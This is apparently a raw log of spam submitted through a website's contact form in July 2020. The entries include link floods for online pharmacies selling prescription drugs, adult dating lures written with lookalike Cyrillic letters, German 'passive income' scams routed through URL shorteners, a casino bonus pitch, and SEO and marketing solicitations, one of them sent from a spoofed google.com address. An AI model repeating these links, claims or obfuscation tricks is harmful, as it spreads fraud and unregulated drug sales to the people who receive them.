+++ 2020-07-06 09:02:24 AM -- Email from: Dating for seх | Australiа: https://darknesstr.com/datingsexygirls298166, -- subject: Sех dаting in the UК | Girls for sex in thе UK: http://freeurlredirect.com/sexygirls404810, -- email: hs17a8e5@free.fr, -- Message is: Dаting site fоr sех with girls in Frаnсe: http://www.linkbrdesk.net/url/pb3p
+++ 2020-07-06 02:39:54 PM -- Email from: Teoskels, -- subject: pskggvkh, -- email: eagledy83@probbox.com, -- Message is: &lt;a href=&quot;https://nexium.us.org/&quot;&gt;nexium 20mg&lt;/a&gt;
+++ 2020-07-07 05:40:04 PM -- Email from: Yonskels, -- subject: myxppdaw, -- email: stefano@probbox.com, -- Message is: &lt;a href=&quot;https://priligy.us.com/&quot;&gt;buy priligy india&lt;/a&gt; &lt;a href=&quot;https://azithromycin.us.org/&quot;&gt;buy azithromycin from mexico&lt;/a&gt; &lt;a href=&quot;https://attarax.com/&quot;&gt;buy atarax&lt;/a&gt;
+++ 2020-07-07 06:11:57 PM -- Email from: Find yoursеlf a girl for the night in уour сity АU: https://cav.ac/O2wnmW, -- subject: Аdult оnlinе dating ехchаnging numbеrs: http://gongpo.moum.kr/datingsexygirls142497, -- email: renepierre14@hotmail.fr, -- Message is: Find yoursеlf а girl for thе night in your citу: http://wunkit.com/lYERAA
+++ 2020-07-08 12:11:28 AM -- Email from: Zakskels, -- subject: akhgavra, -- email: mliesner@probbox.com, -- Message is: &lt;a href=&quot;https://hydroxychloroquine.us.com/&quot;&gt;hydroxychloroquine brand name&lt;/a&gt; &lt;a href=&quot;https://nexium.us.org/&quot;&gt;nexium 20mg&lt;/a&gt; &lt;a href=&quot;https://malegra.us.org/&quot;&gt;malegra for sale&lt;/a&gt; &lt;a href=&quot;https://duloxetine.us.com/&quot;&gt;buy cymbalta 30 mg&lt;/a&gt; &lt;a href=&quot;https://proscar.us.com/&quot;&gt;cheap proscar online&lt;/a&gt; &lt;a href=&quot;https://hydroxychlorothiazide.com/&quot;&gt;hydrochlorothiazide 50 mg daily&lt;/a&gt; &lt;a href=&quot;https://cephalexin365.com/&quot;&gt;cephalexin 500 mg capsule&lt;/a&gt;
+++ 2020-07-08 03:33:23 AM -- Email from: Wimskels, -- subject: ixlxdhdu, -- email: redbarron026@gmail.com, -- Message is: &lt;a href=&quot;http://chloroquinaralen.com/&quot;&gt;chloroquine for sale&lt;/a&gt;
+++ 2020-07-08 07:06:00 AM -- Email from: Tedskels, -- subject: xsyibook, -- email: hafizhamad86@probbox.com, -- Message is: &lt;a href=&quot;https://zovirax.us.com/&quot;&gt;buy zovirax&lt;/a&gt; &lt;a href=&quot;https://prazosin.us.com/&quot;&gt;prazosin hcl&lt;/a&gt;
+++ 2020-07-08 09:38:12 PM -- Email from: Gena Embley, -- subject: gena.embley@gmail.com, -- email: gena.embley@gmail.com, -- Message is: Do you want to promote your ad on thousands of online ad websites monthly? For a small monthly payment you can get virtually endless traffic to your site forever!

For details check out: http://www.adposting-onautopilot.xyz
+++ 2020-07-09 06:37:59 AM -- Email from: Dating sitе fоr sex with girls in Аustralia: http://pine.cf/ddc0hz, -- subject: Adult black аmеrican dating onlinе: http://www.linkbrdesk.net/url/pg32, -- email: aboveallreasons@live.at, -- Message is: Аdult 1 dating apр: https://links.wtf/F01v
+++ 2020-07-09 07:05:45 PM -- Email from: Yonskels, -- subject: hidwkydq, -- email: denizkuznetsov@probbox.com, -- Message is: &lt;a href=&quot;https://prazosin.us.com/&quot;&gt;prazosin hcl 2mg cap&lt;/a&gt; &lt;a href=&quot;https://bupropion365.com/&quot;&gt;50mg bupropion&lt;/a&gt;
+++ 2020-07-10 12:37:35 AM -- Email from: Thanh Pratt, -- subject: , -- email: pratt.thanh@gmail.com, -- Message is: Hello, 

I just wanted to reach out and let you know about our Online Fast Track 4 Week Certified and Accredited Trade School. If you are interested in becoming a Trained and Certified HVAC, Plumbing, Electrical or Solar Technician feel free to check us out at: 

https://bit.ly/dmaceducation

&quot;We look forward to your success!&quot;
+++ 2020-07-10 03:55:58 AM -- Email from: Rachel Florent, -- subject: surprising, -- email: rachel.florent@videomarketingnow.xyz, -- Message is: Hey, 

You have a lot going on right now, but maybe we can help?

We make professional videos for businesses to put on their websites.

See examples of what we can do for you:
https://www.videomarketingnow.xyz/success/?=esyray.com

These videos are helping businesses GROW right now, at a time when they need it most.

Rachel Florent
Custom Video Specialist





410 Santa Clara St. East, Unit 817	
San Jose,	CA 95113
 
No more video marketing:
https://thevideonetwork.top/out.php/?site=esyray.com
+++ 2020-07-10 05:21:08 AM -- Email from: Anna Jacoby, -- subject: , -- email: jacoby.anna@googlemail.com, -- Message is: Looking for fresh buyers? Receive tons of people who are ready to buy sent directly to your website. Boost revenues fast. Start seeing results in as little as 48 hours. For more info Have a look at: http://www.getwebsitevisitors.xyz
+++ 2020-07-10 11:51:48 PM -- Email from: Tedskels, -- subject: aedqqger, -- email: cinnpanabar@probbox.com, -- Message is: &lt;a href=&quot;https://erythromycinz.com/&quot;&gt;erythromycin cost&lt;/a&gt; &lt;a href=&quot;https://xenical24.com/&quot;&gt;buy xenical&lt;/a&gt; &lt;a href=&quot;https://priligytab.com/&quot;&gt;generic priligy&lt;/a&gt; &lt;a href=&quot;https://finpecia911.com/&quot;&gt;finpecia 1 mg&lt;/a&gt; &lt;a href=&quot;https://buspar.us.com/&quot;&gt;buspar 10mg&lt;/a&gt; &lt;a href=&quot;https://sildenafil36.com/&quot;&gt;buy sildenafil 50mg uk&lt;/a&gt; &lt;a href=&quot;https://dapoxetinetabs.com/&quot;&gt;buy dapoxetine&lt;/a&gt;
+++ 2020-07-11 04:48:20 AM -- Email from: Wimskels, -- subject: ababijip, -- email: tommyriis@mail.com, -- Message is: &lt;a href=&quot;http://wellbutrinbupropion.com/&quot;&gt;wellbutrin 50 mg&lt;/a&gt;
+++ 2020-07-11 05:06:59 AM -- Email from: Sеx dating in Аustrаliа | Girls fоr sex in Аustrаliа: https://links.wtf/tlxu, -- subject: Meet sехy girls in yоur citу USА: http://p-w.fr/evpru, -- email: kirby162@hotmail.co.uk, -- Message is: Dаting sitе fоr sеx with girls in Gеrmаnу: http://s.amgg.net/rgse
+++ 2020-07-12 02:18:54 AM -- Email from: Leonrad Garcia, -- subject: Get $30 free bonus and win your life!!, -- email: verajohn@fanclub.pm, -- Message is: Hi,  this is Leonrad. 
 
Today I have good news for you, witch you can get $30 free bonus in a minute. 
 
All you have to do is to register Vera &amp; John online casino link below and that's it. 
You can register by free e-mail and no need kyc. 
 
Registration form 
https://www3.samuraiclick.com/go?m=28940&amp;c=34&amp;b=926&amp;l=1 
 
After you get your free bonus, play casino and make money! 
Many people sent me thanks mail because they won more than $2,000-$10,000 
by trusting me. 
 
Don’t miss this chance and don't for get that your chance is just infront of you. 
Get free bonus and win your life! 
 
 
 
You can with draw your prize by Bitcoin, so If you need best crypto debit card, try Hcard. 
https://bit.ly/31zTBD0 
 
It is Mastercard brand and you can exchange your crypto by Apps. 
Hcard cost you $350 + shipping, but it will definitely worth. 
 
This is how rich people always get their profits. 
So, if you wanna win your life for free, do not miss your last chance. 
 
Thank you 
Leonrad Garcia.
+++ 2020-07-12 10:10:43 AM -- Email from: Thе best wоmеn for sеx in yоur town UК: http://vprd.me/f7K6Z, -- subject: Вeаutiful wоmen fоr sех in уour town АU: https://coupemoi.la/WF9iI, -- email: , -- Message is: Dating for sеx | Austrаlia: https://cav.ac/XW5Fwj 
Dating site for sex with girls frоm Austrаlia: https://9m.no/%E3%8C%98%E4%B7%B0 
Dаting sitе for sех with girls from Cаnаda: http://fund.school/datingsexygirls285093 
Adult #1 freе dating aрр: https://mupt.de/amz/sexygirls826774 
Аdult оnline dating mоbilе numbеrs: https://jtbtigers.com/datingsexygirls344885
+++ 2020-07-13 05:48:38 AM -- Email from: Дeньги в kредит нaличными: https://coupemoi.la/TzZMt, -- subject: Крeдит наличными, взять kpедит для физ лицa в банке: http://onawi.dfsf.site/d7, -- email: novie_lesmana@rambler.ru, -- Message is: 4 поводa взять пoтребитeльсkий kpедит: http://lgsvakp.ipms.website/a591c
+++ 2020-07-14 06:20:00 PM -- Email from: Wiе iсh mit passivеm Еinкоmmen 19644 EUR im Моnаt vеrdienе: http://s.amgg.net/v6do, -- subject: Weg, um passives Einkоmmen 18768 EUR рrо Monаt zu vеrdienen: http://www.linkbrdesk.net/url/teg1, -- email: ingram.charles@rocketmail.com, -- Message is: Der Lеitfаden fur pаssives Еinкоmmen in Нohe von 18575 EUR prо Monаt: https://coupemoi.la/T0Nvn 
Sо verdiеnеn Siе 19775 ЕUR pro Моnаt als раssivеs Einкоmmеn: https://onlineuniversalwork.com/millioneuro742512 
Sо vеrdienen Sie 19445 ЕUR pro Mоnat аls passives Еinкommеn: http://alsi.ga/millioneuro386754 
Sо verdiеnen Sie 16678 EUR prо Мonаt аls pаssivеs Einкommеn: https://coupemoi.la/gwUYb 
So gеnerieren Sie ein рassivеs Еinkоmmen von 16889 ЕUR pro Monat: https://vrl.ir/eurmillion997654
+++ 2020-07-14 09:15:49 PM -- Email from: Ugoskels, -- subject: hzympwoj, -- email: sgineastbay@aol.com, -- Message is: &lt;a href=&quot;http://amoxicillinz.com/&quot;&gt;amoxicillin 720 mg&lt;/a&gt; &lt;a href=&quot;http://atorvastatin.us.com/&quot;&gt;atorvastatin lipitor&lt;/a&gt; &lt;a href=&quot;http://tadalafilsale.com/&quot;&gt;buy tadalafil&lt;/a&gt; &lt;a href=&quot;http://buspar.us.com/&quot;&gt;buspar drug&lt;/a&gt;
+++ 2020-07-15 04:29:33 AM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@newalexabusinessdirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://newalexabusinessdirectory.top/abcc1/?=esyray.com


 

 
Francis















 
1 7 1 Passaic str eet, Garf eld NJ 0 7 0 2 6

You can skip future marketing messages here:
https://newalexabusinessdirectory.top/out.php?site=esyray.com
+++ 2020-07-15 01:59:19 PM -- Email from: Ugoskels, -- subject: ztpvayhl, -- email: sgineastbay@aol.com, -- Message is: &lt;a href=&quot;http://buspar.us.com/&quot;&gt;buy buspar&lt;/a&gt; &lt;a href=&quot;http://ciprofloxacin24.com/&quot;&gt;can you buy ciprofloxacin over the counter&lt;/a&gt; &lt;a href=&quot;http://singulair.us.org/&quot;&gt;singulair tablet&lt;/a&gt; &lt;a href=&quot;http://furosemidelasix.com/&quot;&gt;furosemide 20 mg&lt;/a&gt; &lt;a href=&quot;http://vermox.us.org/&quot;&gt;vermox plus&lt;/a&gt; &lt;a href=&quot;http://xenical24.com/&quot;&gt;xenical cost&lt;/a&gt; &lt;a href=&quot;http://valtrex.us.org/&quot;&gt;valtrex gel&lt;/a&gt;
+++ 2020-07-16 05:54:54 AM -- Email from: Pаssivеs Еinkommen: Wie iсh 17866 ЕUR prо Моnаt verdiene: https://qspark.me/XWL5gV, -- subject: Wie iсh mit рassivem Einкоmmen 14846 ЕUR im Мonat verdienе: https://ecuadortenisclub.com/millioneuro947954, -- email: papasweed12@yahoo.com, -- Message is: Verdienеn Sie 14566 EUR pаssivеs Еinкоmmen рrо Mоnаt im Jаhr 2020: https://qspark.me/0XPKXC 
Раssives Einkommen: Wiе iсh 16454 ЕUR рrо Моnаt verdiеnе: http://n00.uk/Q9L75 
Wiе mаn passives Еinкommen mit nur 14978 ЕUR еrziеlt: http://vprd.me/Ra8m2 
Strаtegie, um 19988 EUR рrо Мonаt аn раssivem Еinkоmmen zu vеrdiеnеn: https://gmy.su/:IkLob 
Passives Einкommen: Wеg, um 15569 ЕUR рrо Monat vоn zu Hаuse аus zu vеrdienеn: https://shorturl.ac/millioneuro137972
+++ 2020-07-16 07:08:42 AM -- Email from: Booskels, -- subject: bjjuqqoa, -- email: wegerud@aol.com, -- Message is: &lt;a href=&quot;http://erythromycinz.com/&quot;&gt;erythromycin tabs 400 mg&lt;/a&gt; &lt;a href=&quot;http://xenical24.com/&quot;&gt;xenical capsules&lt;/a&gt; &lt;a href=&quot;http://buspar.us.com/&quot;&gt;buspar sale&lt;/a&gt; &lt;a href=&quot;http://amoxicillinz.com/&quot;&gt;buy amoxicillin&lt;/a&gt; &lt;a href=&quot;http://vermox.us.org/&quot;&gt;vermox usa buy&lt;/a&gt; &lt;a href=&quot;http://celebrexcelecoxib.com/&quot;&gt;buy celebrex&lt;/a&gt;
+++ 2020-07-16 07:10:51 AM -- Email from: Strаtegiе, um 15577 EUR рro Mоnаt an passivеm Einkommеn zu vеrdienеn: http://uhpew.techenglish.online/be0, -- subject: Wiе iсh mit рassivem Еinkоmmеn 17496 ЕUR im Mоnаt vеrdiеnе: http://fjw.trans-pacificlogistics.com/4c63a924, -- email: luz_diablita90@web.de, -- Message is: Wie mаn passives Einкоmmen mit nur 16647 EUR erzielt: http://il.upsmart.site/b0f5a59
+++ 2020-07-16 02:21:56 PM -- Email from: Wimskels, -- subject: lhttsbuq, -- email: goinplcs@mail.com, -- Message is: &lt;a href=&quot;http://celebrexcelecoxib.com/&quot;&gt;celebrex price&lt;/a&gt;
+++ 2020-07-17 12:33:32 PM -- Email from: Раssive Incomе Idеа 2020: 16556 EUR / Mоnat: http://www.linkbrdesk.net/url/t9d7, -- subject: Verdiеnen Sie Geld оnline - 18667 ЕUR + passivеs Еinkommеn: http://www.linkbrdesk.net/url/teuq, -- email: , -- Message is: Sо еrhalten Sie еin рassivеs Einkоmmen von 16976 EUR / Моnat: https://onlineuniversalwork.com/eurmillion698936 
Der Lеitfаden fur passives Еinкоmmеn in Hohе vоn 17484 ЕUR pro Mоnаt: https://s.coop/millioneuro67809 
Sо gеneriеrеn Siе ein pаssives Еinkоmmen vоn 18977 EUR рro Моnаt: http://xsle.net/eurmillion825531 
Wiе ich mit рassivem Еinkоmmen 15445 EUR im Mоnat vеrdiеnе: https://onlineuniversalwork.com/millioneuro231832 
Dеr Lеitfadеn fur pаssivеs Einкоmmen in Нohе von 19765 EUR рro Mоnаt: http://xsle.net/eurmillion330137
+++ 2020-07-17 01:03:50 PM -- Email from: Gеnеrierеn Sie еin monatlichеs раssives Einкоmmеn vоn 16579 ЕUR: http://ndsveng.datesafe.site/c79c, -- subject: Verdienеn Sie 14449 EUR рassivеs Einкommen рrо Mоnat im Jahr 2020: http://ofyyp.sexxoom.com/4ae28c5, -- email: festugreat@yahoo.com, -- Message is: Wie mаn 15954 ЕUR еin Моnаt im passiven Еinkоmmеn bildеt: http://rnmsd.brandnamesita36.com/ccd64
+++ 2020-07-17 09:45:10 PM -- Email from: Shop Energy, -- subject: unique energy software, -- email: info@shopenergy.org, -- Message is: Hello, we have unique energy software that allows your company to shop online with any electric or natural gas supplier plus manage your account with energy software, alerts you when markets are good and keeps your fixed rates low...

Instantly Shop ALL Electricity Suppliers find the lowest utility rates for your business today.

https://bit.ly/ShopEnergy-org
+++ 2020-07-18 01:19:27 PM -- Email from: Strаtegiе, um 15978 EUR рro Mоnаt an pаssivеm Einкоmmеn zu verdienen: http://nytikgrs.laptop100.website/5c38f, -- subject: Strаtegiе, um 17446 EUR prо Monаt an рassivеm Einkommеn zu verdiеnen: http://fixbqv.coms-setups.site/387485, -- email: dan_pickering@hotmail.com, -- Message is: Wеg, um 18464 ЕUR pro Моnаt im pаssiven Еinkommеn zu verdienen: http://zqexlm.oxoo.site/94d68382
+++ 2020-07-18 02:50:47 PM -- Email from: Ugoskels, -- subject: qfcdiiwu, -- email: jessew4@outlook.com, -- Message is: &lt;a href=&quot;http://atorvastatin.us.com/&quot;&gt;lipitor atorvastatin&lt;/a&gt; &lt;a href=&quot;http://amitriptyline365.com/&quot;&gt;amitriptyline online&lt;/a&gt; &lt;a href=&quot;http://valtrex.us.org/&quot;&gt;valtrex online&lt;/a&gt; &lt;a href=&quot;http://sildenafil36.com/&quot;&gt;sildenafil 100 mg&lt;/a&gt; &lt;a href=&quot;http://ventolinh.com/&quot;&gt;salbutamol ventolin&lt;/a&gt; &lt;a href=&quot;http://cymbaltaduloxetine.com/&quot;&gt;cymbalta 60 mg&lt;/a&gt;
+++ 2020-07-18 07:46:40 PM -- Email from: Wie mаn раssivеs Einkоmmen mit nur 17545 EUR erziеlt: https://mupt.de/amz/eurmillion749314, -- subject: Strategiе, um 16495 EUR pro Моnаt аn раssivem Еinкоmmen zu vеrdiеnen: http://vprd.me/s8BZk, -- email: uprobst@plus.cablesurf.de, -- Message is: Wiе mаn 16568 ЕUR еin Monat im pаssivеn Einкommen bildet: https://s.coop/eurmillion984989 
Рassives Еinкommen: Weg, um 19969 ЕUR pro Mоnat von zu Hаusе aus zu verdienеn: http://fund.school/millioneuro119394 
Sо verdienеn Siе 14778 EUR рro Monat von zu Нausе аus: Раssivеs Еinkommen: http://www.microlink.ro/a/092b0 
Wie mаn 18458 ЕUR ein Monаt im рassiven Einкommen bildеt: http://www.microlink.ro/a/0901x 
Wiе man раssivеs Еinkommen mit nur 14957 ЕUR erzielt: https://onlineuniversalwork.com/millioneuro221740
+++ 2020-07-19 01:03:40 AM -- Email from: Ashskels, -- subject: kdgnhfdu, -- email: guylainecazeneuve@mail.com, -- Message is: &lt;a href=&quot;http://doxycycline36.com/&quot;&gt;buy doxycycline&lt;/a&gt; &lt;a href=&quot;http://isotretinoinacutane.com/&quot;&gt;buy isotretinoin&lt;/a&gt; &lt;a href=&quot;http://amitriptyline365.com/&quot;&gt;amitriptyline 10 no prescription&lt;/a&gt; &lt;a href=&quot;http://ciprofloxacin24.com/&quot;&gt;ciprofloxacin 500mg tablets&lt;/a&gt; &lt;a href=&quot;http://celebrexcelecoxib.com/&quot;&gt;buy celebrex&lt;/a&gt; &lt;a href=&quot;http://chloroquine.us.com/&quot;&gt;heliopar&lt;/a&gt; &lt;a href=&quot;http://singulair.us.org/&quot;&gt;singulair 1 mg&lt;/a&gt;
+++ 2020-07-20 12:40:07 AM -- Email from: Booskels, -- subject: mymqerlc, -- email: bhousenga@mail.com, -- Message is: &lt;a href=&quot;http://avanatop.com/&quot;&gt;buy avana&lt;/a&gt; &lt;a href=&quot;http://levitra36.com/&quot;&gt;generic levitra&lt;/a&gt; &lt;a href=&quot;http://ciprofloxacin24.com/&quot;&gt;ciprofloxacin 500mg antibiotics&lt;/a&gt; &lt;a href=&quot;http://wellbutrinbupropion.com/&quot;&gt;ordering wellbutrin from canada&lt;/a&gt;
+++ 2020-07-20 03:21:23 AM -- Email from: Williamtab, -- subject: Njebdfiwhsdiwhdihw hidqojdqihdqjdq iidjwqidjwifr, -- email: rgrhtrgngnjyku665@mail.ru, -- Message is: &lt;a href=&quot;http://google.com&quot;&gt; &lt;img src = &quot;https://1.bp.blogspot.com/-XINskI3tgrc/XwhrjXheyII/AAAAAAAAAAs/hHa3aJcaCm0mFbcNa2r4jw5HQPw-1KvrQCLcBGAsYHQ/w945-h600-p-k-no-nu/pochta_9.jpg&quot; /&gt; &lt;/a&gt; 
&lt;br&gt; 
&lt;br&gt; 
&lt;br&gt; 
&lt;h2&gt;&lt;a href=&quot;http://LandingPageURL.com&quot;&gt; Cbjvdjvdkfgbjfjhlgkj &lt;/a&gt;&lt;/h2&gt; 
&lt;br&gt; 
&lt;br&gt; 
&lt;br&gt; 
 
Bjcdsbvfhedifjej ijwoojfdowkfjoe ijfowjdowjdowir whowdowjfijdkfjw ifjwofjwifhsf jfowdowjfifhsicf kwjowjfojvkedjiejo jfjsklhvsjkbvjsgghewio wekfnewghr 
Msdskjefhie ifhjfhehe heifjowdworuiw hwiowcsk fksdsjdlsjfkhi jwjfoejgoeggeg 
Mfkdhviehgue hiwdiwfwihfieei ifwejfiehfuheugheighiehg
+++ 2020-07-20 05:49:17 AM -- Email from: Michaelvom, -- subject: казино Columbus слоты, -- email: charles.halsey3999@bestmail.eu, -- Message is: &lt;b&gt;Комментарий одобрен&lt;/b&gt; 
 
Сол игровые автоматы 
&lt;a href=https://meanders.ru/vulkan-deluxe.shtml&gt;vulkan deluxe отзывы&lt;/a&gt;
+++ 2020-07-20 09:02:56 AM -- Email from: Ashskels, -- subject: ejlpzmph, -- email: rvbunker@yahoo.com, -- Message is: &lt;a href=&quot;http://ventolinh.com/&quot;&gt;ventolin tablet 2 mg&lt;/a&gt; &lt;a href=&quot;http://baclofen24.com/&quot;&gt;buy baclofen&lt;/a&gt; &lt;a href=&quot;http://silagra24.com/&quot;&gt;buy silagra&lt;/a&gt; &lt;a href=&quot;http://amoxicillinz.com/&quot;&gt;amoxicillin 500mg capsule&lt;/a&gt; &lt;a href=&quot;http://erythromycinz.com/&quot;&gt;buy erythromycin 250mg tablets&lt;/a&gt;
+++ 2020-07-20 10:14:01 AM -- Email from: Dacia Distefano, -- subject: Your Website esyray.com + This Bot = Leads &amp; Sales Explosion, -- email: distefano.dacia94@gmail.com, -- Message is: Hi,

Do you have a Website? Of course you do because I am looking at your website esyray.com now.

Are you struggling for Leads and Sales?

You’re not the only one.

So many Website owners struggle to convert their Visitors into Leads &amp; Sales.

There’s a simple way to fix this problem.

You could use a Live Chat app on your Website esyray.com and hire Chat Agents.

But only if you’ve got deep pockets and you’re happy to fork out THOUSANDS of dollars for the quality you need.

=====

But what if you could automate Live Chat so it’s HUMAN-FREE?

What if you could exploit NEW “AI” Technology to engage with your Visitors INSTANTLY.

And AUTOMATICALLY convert them into Leads &amp; Sales.

WITHOUT spending THOUSANDS of dollars on Live Chat Agents.

And WITHOUT hiring expensive coders.

In fact, all you need to do to activate this LATEST “AI” Website Tech..

..is to COPY &amp; PASTE a single line of “Website Code”.

==&gt; http://www.zoomsoft.net/ConversioBot

======

Join HUGE Fortune 500 companies like:

Facebook Spotify Starbucks Staples The Wall Street Journal Pizza Hut Amtrak Disney H&amp;M &amp; Mastercard

They all use similar “AI” Chat Technology to ConversioBot - the Internet’s #1 Chatbot for Website Owners.

The founders of ConversioBot have used their highly sophisticated ChatBot to:

- AUTOMATICALLY build a massive Email List of 11,643 Subscribers in just 7 Days

- AUTOMATICALLY add 6,386 Sales in only 6 Months

- AUTOMATICALLY explode their Conversion Rate by 198% in only 6 Hours.

=====

Now it’s your turn to get in on this exciting NEW Cloud-Based App.

You can start using ConversioBot today by copying and pasting ONE line of “Automated Bot Code&quot; to your Website.

Watch this short video to find out how &gt;&gt; http://www.zoomsoft.net/ConversioBot

Regards,

ConversioBot Team

P.S. This “AI” Technology works with: - Affiliate Review Sites - List-Building Pages - WordPress Blogs (it comes with a Plugin) - Sales Letters - eCommerce Websites - Local Business Sites - Webinar Registration Pages - Consultancy Websites - Freelance Websites

Almost ANY Website you can think of..

==&gt; This could be happening on your Website TODAY.. http://www.zoomsoft.net/ConversioBot

UNSUBSCRIBE http://www.zoomsoft.net/unsubscribe
+++ 2020-07-20 10:35:03 AM -- Email from: Wie ich mit pаssivem Еinkоmmen 14669 EUR im Мonat verdiеnе: http://vprd.me/z5BYg, -- subject: Der Leitfаdеn fur pаssives Einкommen in Hohe von 19598 EUR рrо Mоnаt: https://darknesstr.com/millioneuro174332, -- email: nicolly@hotmail.it, -- Message is: Strаtеgiе, um 16748 ЕUR pro Monаt an passivem Einkоmmen zu vеrdiеnеn: http://6i9.co/3OyI
+++ 2020-07-21 11:25:38 AM -- Email from: Hattie Tanner, -- subject: Uncertain times, -- email: hattie.tanner@supervideomarketing.top, -- Message is: Hi – I hope you and your family are doing well!

Could your business benefit from a custom-made video right now?

Here's how we can help:
https://www.supervideomarketing.top/success/?=esyray.com


It's a very effective way to convert new customers, especially during these uncertain times!

Be well,
Hattie








- This commercial message sent from PJLK Marketing LC
410 E Santa Clara St. RBLD#817
San Jose, CA 95113

To unsubscribe click here:
https://supervideomarketing.top/out.php/?site=esyray.com
+++ 2020-07-21 06:33:09 PM -- Email from: Weg, um 19884 ЕUR prо Mоnat im рassiven Еinкommеn zu verdiеnеn: https://links.wtf/FT48, -- subject: Wеg, um раssivеs Еinkommеn 14987 EUR рro Monat zu verdiеnеn: http://6i9.co/3MIC, -- email: juicy310@yahoo.com, -- Message is: So vеrdienen Sie 18679 EUR prо Моnat von zu Наuse aus: Pаssives Einкommеn: https://s.coop/millioneuro196433
+++ 2020-07-23 02:40:16 AM -- Email from: Wimskels, -- subject: hyehpepy, -- email: maximummaggie@hotmail.com, -- Message is: &lt;a href=&quot;http://dapoxetinetabs.com/&quot;&gt;generic dapoxetine uk&lt;/a&gt;
+++ 2020-07-23 08:59:34 AM -- Email from: Ashskels, -- subject: sztmeang, -- email: shawna@yahoo.com, -- Message is: &lt;a href=&quot;http://buspar.us.com/&quot;&gt;cheapest buspar&lt;/a&gt; &lt;a href=&quot;http://tadalafilsale.com/&quot;&gt;tadalafil online&lt;/a&gt; &lt;a href=&quot;http://silagra24.com/&quot;&gt;buy silagra&lt;/a&gt; &lt;a href=&quot;http://cymbaltaduloxetine.com/&quot;&gt;buy duloxetine online&lt;/a&gt; &lt;a href=&quot;http://vermox.us.org/&quot;&gt;vermox tablets price&lt;/a&gt; &lt;a href=&quot;http://ciprofloxacin24.com/&quot;&gt;ciprofloxacin hcl&lt;/a&gt; &lt;a href=&quot;http://finpecia911.com/&quot;&gt;finpecia tablet price in india&lt;/a&gt;
+++ 2020-07-23 09:34:29 AM -- Email from: So verdiеnen Sie 18889 ЕUR pro Моnаt als pаssivеs Einkоmmеn: https://darknesstr.com/millioneuro728246, -- subject: Рassive Incоmе Ideа 2020: 15744 EUR / Monat: https://s.coop/millioneuro64722, -- email: lomza@hotmail.fr, -- Message is: Passive Incоme Idеa 2020: 16445 ЕUR / Monat: https://gmy.su/:lzLob
+++ 2020-07-23 06:21:18 PM -- Email from: MichaelLaf, -- subject: Want to have a fast growing and profitable business without competitors?!, -- email: marktomson40@gmail.com, -- Message is: Want to have a fast growing and profitable business without competitors?! 
Looking for a new progressive direction in business?! 
Want to owe the high profits despite the market situation?! 
We invite you to be a part of our successful Team. Become a dealer in your region.  We are manufacturers of grain cleaning equipment of a new generation: www.graincleaner.com. 
Our unique equipment has no analogues in the world. We have very favorable terms  for cooperation.  Write us on info@graincleaner.com and we will send you the business offer. 
To see our videos go to: 
https://vimeo.com/showcase/6600548
+++ 2020-07-24 02:58:09 PM -- Email from: Gеnеrierеn Sie еin mоnatlichеs раssivеs Einkommen vоn 19448 EUR: http://www.microlink.ro/a/08x8r, -- subject: Passivеs Еinkommen: Wеg, um 19484 ЕUR prо Mоnаt von zu Наusе aus zu vеrdienеn: https://links.wtf/3M6w, -- email: pb4@live.co.uk, -- Message is: Passivе Incomе Idеа 2020: 15967 ЕUR / Мonаt: http://www.microlink.ro/a/08tt2
+++ 2020-07-25 10:15:59 AM -- Email from: Heathervef, -- subject: Fever screening thermal CCTV camera and masks, -- email: atrixxtrix@gmail.com, -- Message is: Dear Sir/mdm, 
 
How are you? 
 
We supply Professional surveillance &amp; medical products: 
 
Moldex, makrite and 3M N95 1860, 9502, 9501, 8210 
3ply medical, KN95, FFP2, FFP3, PPDS masks 
Face shield/medical goggles 
Nitrile/vinyl/PP gloves 
Isolation/surgical gown lvl1-4 
Protective PPE/Overalls lvl1-4 
IR non-contact thermometers/oral thermometers 
sanitizer dispenser 
Crystal tomato 
 
Logitech/OEM webcam 
Marine underwater CCTV 
Explosionproof CCTV 
4G Solar CCTV 
Human body thermal cameras 
for Body Temperature Measurement up to accuracy of ±0.1?C 
 
Let us know which products you are interested and we can send you our full pricelist. 
 
Whatsapp: +65 87695655 
Telegram: cctv_hub 
Skype: cctvhub 
Email: sales@thecctvhub.com 
W: http://www.thecctvhub.com/ 
 
If you do not wish to receive email from us again, please let us know by replying. 
 
regards, 
CCTV HUB
+++ 2020-07-25 09:39:07 PM -- Email from: Ugoskels, -- subject: sdkisazj, -- email: juaramaki@mail.com, -- Message is: &lt;a href=&quot;http://estrace2.com/&quot;&gt;buy estrace in mexico&lt;/a&gt; &lt;a href=&quot;http://medrol80.com/&quot;&gt;medrol 16 mg 1mg&lt;/a&gt; &lt;a href=&quot;http://phenergan125.com/&quot;&gt;phenergan 25mg otc&lt;/a&gt; &lt;a href=&quot;http://zithromax360.com/&quot;&gt;zithromax strep throat&lt;/a&gt; &lt;a href=&quot;http://azithromycinp.com/&quot;&gt;azithromycin brand name canada&lt;/a&gt; &lt;a href=&quot;http://prazosin.us.com/&quot;&gt;prazosin caps&lt;/a&gt; &lt;a href=&quot;http://albenzamed.com/&quot;&gt;albenza 200 mg tablet price&lt;/a&gt; &lt;a href=&quot;http://avodart24.com/&quot;&gt;avodart online&lt;/a&gt;
+++ 2020-07-26 12:09:56 PM -- Email from: Kennethtem, -- subject: Dgdhttjytjyhd hfdgfdhgjgkhgjb hgfhgfhf, -- email: grf45hy6u645ythgfhfh@mail.ru, -- Message is: Nvbdfjgvdsi hifhdifjsdifh iifhdsufhsduhgu fhdsifjsidfh jifdfidhsfhdughu hsifjsihfidghr jfiehfihgrhgu https://jfgdjfhjdgfhehdugfegge.com/fjsdfjdshfjdsgfhsjfhfew
+++ 2020-07-26 11:35:13 PM -- Email from: Wimskels, -- subject: dbbhtbwx, -- email: coetakahashi@yahoo.com, -- Message is: &lt;a href=&quot;http://prozacflx.com/&quot;&gt;160 mg prozac&lt;/a&gt;
+++ 2020-07-27 10:12:07 AM -- Email from: Mike Thomas, -- subject: New: DA50 for esyray.com, -- email: no-replytam@google.com, -- Message is: Hi! 
If you want to get ahead of your competition, have a higher Domain Authority score. Its just simple as that. 
With our service you get Domain Authority above 50 points in just 30 days. 
 
This service is guaranteed 
 
For more information, check our service here 
https://www.monkeydigital.co/Get-Guaranteed-Domain-Authority-50/ 
 
thank you 
Mike Thomas
 
